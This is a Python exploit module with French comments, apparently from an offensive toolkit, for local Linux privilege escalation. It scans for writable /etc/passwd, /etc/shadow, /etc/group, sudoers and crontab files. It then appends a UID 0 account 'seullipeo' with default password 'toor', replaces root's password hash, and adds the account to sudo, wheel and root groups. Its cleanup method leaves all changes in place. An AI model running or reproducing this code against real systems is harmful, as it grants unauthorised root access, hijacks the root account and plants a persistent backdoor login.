#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module d'exploitation /etc/passwd modifiable
Exploite un fichier /etc/passwd modifiable pour créer des utilisateurs privilégiés
"""

import os
import pwd
import crypt
import time
import shutil
from datetime import datetime

from exploits import BaseModule
from utils.system import run_command, is_writable
from utils.logger import get_logger

logger = get_logger(__name__)

class Module(BaseModule):
    """Module d'exploitation /etc/passwd modifiable"""
    
    # Métadonnées
    description = "Exploite un fichier /etc/passwd modifiable"
    author = "huoshi"
    risk_level = "Critical"
    targets = ["Linux", "Unix"]
    
    # Options configurables
    options = {
        'USERNAME': 'Nom d\'utilisateur à créer (défaut: seullipeo)',
        'PASSWORD': 'Mot de passe pour le nouvel utilisateur',
        'UID': 'UID pour le nouvel utilisateur (0 = root)',
        'SHELL': 'Shell par défaut (/bin/bash)'
    }
    
    def __init__(self):
        super().__init__()
        self.passwd_file = '/etc/passwd'
        self.shadow_file = '/etc/shadow'
        self.group_file = '/etc/group'
        
        # Configuration par défaut
        self.default_username = 'seullipeo'
        self.default_password = 'toor'
        self.default_uid = 0
        self.default_gid = 0
        self.default_shell = '/bin/bash'
        
    def scan(self):
        """
        Scanne les fichiers système pour détecter les vulnérabilités
        
        Returns:
            list: Liste des vulnérabilités trouvées
        """
        logger.info("Démarrage du scan passwd writable")
        vulnerabilities = []
        
        # Vérification /etc/passwd
        if os.path.exists(self.passwd_file):
            if is_writable(self.passwd_file):
                vulnerabilities.append({
                    'type': 'writable_passwd',
                    'path': self.passwd_file,
                    'description': 'Fichier /etc/passwd modifiable',
                    'risk': 'Critical',
                    'details': 'Le fichier /etc/passwd est modifiable, permettant la création d\'utilisateurs privilégiés'
                })
            else:
                # Vérification des permissions détaillées
                perms_info = self._analyze_file_permissions(self.passwd_file)
                if perms_info:
                    vulnerabilities.append(perms_info)
        
        # Vérification /etc/shadow
        if os.path.exists(self.shadow_file):
            if is_writable(self.shadow_file):
                vulnerabilities.append({
                    'type': 'writable_shadow',
                    'path': self.shadow_file,
                    'description': 'Fichier /etc/shadow modifiable',
                    'risk': 'Critical',
                    'details': 'Le fichier /etc/shadow est modifiable, permettant la modification des mots de passe'
                })
        
        # Vérification /etc/group
        if os.path.exists(self.group_file):
            if is_writable(self.group_file):
                vulnerabilities.append({
                    'type': 'writable_group',
                    'path': self.group_file,
                    'description': 'Fichier /etc/group modifiable',
                    'risk': 'High',
                    'details': 'Le fichier /etc/group est modifiable, permettant l\'ajout à des groupes privilégiés'
                })
        
        # Recherche d'autres fichiers système modifiables
        system_files = [
            '/etc/sudoers',
            '/etc/sudoers.d/',
            '/etc/hosts',
            '/etc/crontab'
        ]
        
        for sys_file in system_files:
            if os.path.exists(sys_file):
                if os.path.isdir(sys_file):
                    if is_writable(sys_file):
                        vulnerabilities.append({
                            'type': 'writable_system_dir',
                            'path': sys_file,
                            'description': f'Répertoire système modifiable: {sys_file}',
                            'risk': 'High',
                            'details': f'Le répertoire {sys_file} est modifiable'
                        })
                elif is_writable(sys_file):
                    vulnerabilities.append({
                        'type': 'writable_system_file',
                        'path': sys_file,
                        'description': f'Fichier système modifiable: {sys_file}',
                        'risk': 'High',
                        'details': f'Le fichier {sys_file} est modifiable'
                    })
        
        self.results = vulnerabilities
        logger.info(f"Scan passwd writable terminé: {len(vulnerabilities)} vulnérabilités trouvées")
        
        return vulnerabilities
    
    def _analyze_file_permissions(self, file_path):
        """Analyse détaillée des permissions d'un fichier"""
        try:
            stat_info = os.stat(file_path)
            file_mode = stat_info.st_mode
            
            # Vérification des permissions groupe/autres
            if file_mode & 0o020:  # Groupe peut écrire
                return {
                    'type': 'group_writable_passwd',
                    'path': file_path,
                    'description': f'Fichier {file_path} modifiable par le groupe',
                    'risk': 'High',
                    'details': 'Le fichier est modifiable par les membres du groupe'
                }
            
            if file_mode & 0o002:  # Autres peuvent écrire
                return {
                    'type': 'world_writable_passwd',
                    'path': file_path,
                    'description': f'Fichier {file_path} modifiable par tous',
                    'risk': 'Critical',
                    'details': 'Le fichier est modifiable par tous les utilisateurs'
                }
                
        except OSError:
            pass
        
        return None
    
    def exploit_all(self):
        """
        Exploite toutes les vulnérabilités trouvées
        
        Returns:
            list: Résultats des exploitations
        """
        if not self.results:
            return []
        
        exploit_results = []
        
        for vulnerability in self.results:
            try:
                result = self.exploit_single(vulnerability)
                exploit_results.append(result)
            except Exception as e:
                exploit_results.append({
                    'success': False,
                    'vulnerability': vulnerability,
                    'error': str(e),
                    'description': f'Erreur exploitation {vulnerability["path"]}'
                })
        
        return exploit_results
    
    def exploit_single(self, vulnerability):
        """
        Exploite une vulnérabilité spécifique
        
        Args:
            vulnerability (dict): Vulnérabilité à exploiter
            
        Returns:
            dict: Résultat de l'exploitation
        """
        vuln_type = vulnerability.get('type')
        path = vulnerability.get('path')
        
        if vuln_type in ['writable_passwd', 'group_writable_passwd', 'world_writable_passwd']:
            return self._exploit_writable_passwd(vulnerability)
        elif vuln_type == 'writable_shadow':
            return self._exploit_writable_shadow(vulnerability)
        elif vuln_type == 'writable_group':
            return self._exploit_writable_group(vulnerability)
        elif vuln_type in ['writable_system_file', 'writable_system_dir']:
            return self._exploit_system_file(vulnerability)
        else:
            return {
                'success': False,
                'vulnerability': vulnerability,
                'error': f'Type de vulnérabilité non supporté: {vuln_type}',
                'description': f'Exploitation non implémentée pour {vuln_type}'
            }
    
    def _exploit_writable_passwd(self, vulnerability):
        """Exploite un fichier /etc/passwd modifiable"""
        path = vulnerability['path']
        
        try:
            # Configuration de l'utilisateur à créer
            username = self.options.get('USERNAME', self.default_username)
            password = self.options.get('PASSWORD', self.default_password)
            uid = int(self.options.get('UID', self.default_uid))
            gid = int(self.options.get('GID', self.default_gid))
            shell = self.options.get('SHELL', self.default_shell)
            
            # Vérification si l'utilisateur existe déjà
            if self._user_exists(username):
                return {
                    'success': False,
                    'vulnerability': vulnerability,
                    'error': f'L\'utilisateur {username} existe déjà',
                    'description': f'Impossible de créer {username}: utilisateur existant'
                }
            
            # Backup du fichier original
            backup_path = f"{path}.backup.{int(time.time())}"
            shutil.copy2(path, backup_path)
            
            # Génération du hash du mot de passe
            password_hash = self._generate_password_hash(password)
            
            # Création de l'entrée passwd
            passwd_entry = f"{username}:{password_hash}:{uid}:{gid}:Seullipeo User:/home/{username}:{shell}\n"
            
            # Ajout de l'entrée au fichier
            with open(path, 'a') as f:
                f.write(passwd_entry)
            
            # Vérification que l'utilisateur a été créé
            if self._user_exists(username):
                return {
                    'success': True,
                    'vulnerability': vulnerability,
                    'description': f'Utilisateur privilégié créé: {username}',
                    'username': username,
                    'password': password,
                    'uid': uid,
                    'backup_path': backup_path,
                    'details': f'Utilisateur {username} créé avec UID {uid}'
                }
            else:
                return {
                    'success': False,
                    'vulnerability': vulnerability,
                    'error': 'Utilisateur non créé (vérification échouée)',
                    'description': f'Échec création utilisateur {username}'
                }
                
        except Exception as e:
            return {
                'success': False,
                'vulnerability': vulnerability,
                'error': str(e),
                'description': f'Erreur lors de l\'exploitation de {path}'
            }
    
    def _exploit_writable_shadow(self, vulnerability):
        """Exploite un fichier /etc/shadow modifiable"""
        path = vulnerability['path']
        
        try:
            username = self.options.get('USERNAME', self.default_username)
            password = self.options.get('PASSWORD', self.default_password)
            
            # Backup du fichier
            backup_path = f"{path}.backup.{int(time.time())}"
            shutil.copy2(path, backup_path)
            
            # Lecture du contenu actuel
            with open(path, 'r') as f:
                lines = f.readlines()
            
            # Modification du mot de passe root ou ajout d'entrée
            password_hash = self._generate_shadow_hash(password)
            modified = False
            
            # Tentative de modification du mot de passe root
            for i, line in enumerate(lines):
                if line.startswith('root:'):
                    parts = line.strip().split(':')
                    if len(parts) >= 2:
                        parts[1] = password_hash  # Remplacer le hash
                        lines[i] = ':'.join(parts) + '\n'
                        modified = True
                        break
            
            # Si pas de modification root, ajouter un nouvel utilisateur
            if not modified:
                shadow_entry = f"{username}:{password_hash}:18000:0:99999:7:::\n"
                lines.append(shadow_entry)
            
            # Écriture des modifications
            with open(path, 'w') as f:
                f.writelines(lines)
            
            return {
                'success': True,
                'vulnerability': vulnerability,
                'description': f'Fichier shadow modifié: {path}',
                'username': 'root' if modified else username,
                'password': password,
                'backup_path': backup_path,
                'details': 'Mot de passe root modifié' if modified else f'Entrée shadow ajoutée pour {username}'
            }
            
        except Exception as e:
            return {
                'success': False,
                'vulnerability': vulnerability,
                'error': str(e),
                'description': f'Erreur lors de l\'exploitation shadow {path}'
            }
    
    def _exploit_writable_group(self, vulnerability):
        """Exploite un fichier /etc/group modifiable"""
        path = vulnerability['path']
        
        try:
            username = self.options.get('USERNAME', self.default_username)
            
            # Backup du fichier
            backup_path = f"{path}.backup.{int(time.time())}"
            shutil.copy2(path, backup_path)
            
            # Lecture du contenu actuel
            with open(path, 'r') as f:
                lines = f.readlines()
            
            # Ajout de l'utilisateur au groupe sudo/wheel/admin
            privileged_groups = ['sudo', 'wheel', 'admin', 'root']
            modifications = []
            
            for i, line in enumerate(lines):
                for group in privileged_groups:
                    if line.startswith(f'{group}:'):
                        parts = line.strip().split(':')
                        if len(parts) >= 4:
                            members = parts[3].split(',') if parts[3] else []
                            if username not in members:
                                members.append(username)
                                parts[3] = ','.join(filter(None, members))
                                lines[i] = ':'.join(parts) + '\n'
                                modifications.append(group)
                        break
            
            # Écriture des modifications
            if modifications:
                with open(path, 'w') as f:
                    f.writelines(lines)
                
                return {
                    'success': True,
                    'vulnerability': vulnerability,
                    'description': f'Utilisateur ajouté aux groupes privilégiés',
                    'username': username,
                    'groups': modifications,
                    'backup_path': backup_path,
                    'details': f'Utilisateur {username} ajouté aux groupes: {", ".join(modifications)}'
                }
            else:
                return {
                    'success': False,
                    'vulnerability': vulnerability,
                    'error': 'Aucun groupe privilégié trouvé',
                    'description': 'Aucune modification effectuée'
                }
                
        except Exception as e:
            return {
                'success': False,
                'vulnerability': vulnerability,
                'error': str(e),
                'description': f'Erreur lors de l\'exploitation group {path}'
            }
    
    def _exploit_system_file(self, vulnerability):
        """Exploite un fichier système modifiable"""
        path = vulnerability['path']
        
        # Cette méthode peut être étendue selon le fichier spécifique
        return {
            'success': True,
            'vulnerability': vulnerability,
            'description': f'Fichier système modifiable détecté: {path}',
            'details': 'Fichier système accessible en écriture - exploitation manuelle recommandée'
        }
    
    def _user_exists(self, username):
        """Vérifie si un utilisateur existe"""
        try:
            pwd.getpwnam(username)
            return True
        except KeyError:
            return False
    
    def _generate_password_hash(self, password):
        """Génère un hash de mot de passe pour /etc/passwd"""
        # Utilisation de crypt avec salt
        return crypt.crypt(password, crypt.mksalt(crypt.METHOD_SHA512))
    
    def _generate_shadow_hash(self, password):
        """Génère un hash de mot de passe pour /etc/shadow"""
        return crypt.crypt(password, crypt.mksalt(crypt.METHOD_SHA512))
    
    def cleanup(self):
        """Nettoie les modifications (optionnel)"""
        # Cette méthode pourrait supprimer les utilisateurs créés
        # En mode de démonstration, on garde les modifications
        pass